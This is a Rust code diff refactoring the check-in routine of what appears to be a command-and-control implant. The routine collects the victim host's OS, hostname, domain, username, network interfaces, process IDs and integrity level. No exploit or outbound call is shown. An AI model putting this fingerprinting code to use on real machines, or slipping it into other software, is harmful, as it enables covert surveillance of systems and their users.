@@ -1,12 +1,9 @@
 use core::ffi::c_void;
 
 use kageshirei_communication_protocol::{
-    communication::{
-        checkin::{Checkin, PartialCheckin},
-        task_output::TaskOutput,
-    },
-    metadata::Metadata,
-    network_interface::NetworkInterface,
+    communication::{Checkin, TaskOutput},
+    Metadata,
+    NetworkInterface,
 };
 use libc_print::libc_println;
 use mod_agentcore::{instance, instance_mut};
@@ -91,7 +88,7 @@ pub fn command_exit(exit_type: i32) -> TaskOutput {
 /// This function uses several `unsafe` blocks to interact with system-level APIs and perform raw
 /// pointer dereferencing. The caller must ensure that the system and memory are in a valid state
 /// before calling this function.
-pub fn command_checkin(metadata: Metadata) -> TaskOutput {
+pub fn command_checkin() -> TaskOutput {
     let mut output = TaskOutput::new();
     output.started_at = Some(current_timestamp());
 
@@ -150,21 +147,20 @@ pub fn command_checkin(metadata: Metadata) -> TaskOutput {
 
     // Create a `Checkin` object with the gathered metadata.
     let mut checkin = unsafe {
-        Box::new(Checkin::new(PartialCheckin {
+        Box::new(Checkin {
             operative_system: operating_system, // OS details.
             hostname,                           // Computer hostname.
             domain: get_user_domain(),          // User's domain name.
             username: get_username(),           // User's username.
             network_interfaces,                 // Network adapter IP addresses.
-            process_id: pid as i64,             // Process ID.
-            parent_process_id: ppid as i64,     // Parent Process ID.
+            pid: pid as i64,                    // Process ID.
+            ppid: ppid as i64,                  // Parent Process ID.
             process_name: get_process_name(),   // Name of the current process.
             integrity_level: rid,               // Process integrity level.
             cwd: get_image_path_name(),         // Current working directory.
-        }))
+            metadata: None,                     // Metadata is set later.
+        })
     };
-
-    checkin.with_metadata(metadata.clone());
 
     // Set the `Checkin` data in the global instance for further access.
     unsafe { instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void) };
@@ -180,7 +176,6 @@ pub fn command_checkin(metadata: Metadata) -> TaskOutput {
     output.ended_at = Some(current_timestamp());
     output.output = Some(output_json);
     output.exit_code = Some(0);
-    output.with_metadata(metadata);
     output
 }
 
@@ -199,7 +194,7 @@ mod tests {
         };
 
         // Test gathering system information and metadata for check-in
-        let result = command_checkin(metadata);
+        let result = command_checkin();
 
         // Ensure the result is correct by checking if output is present
         assert!(
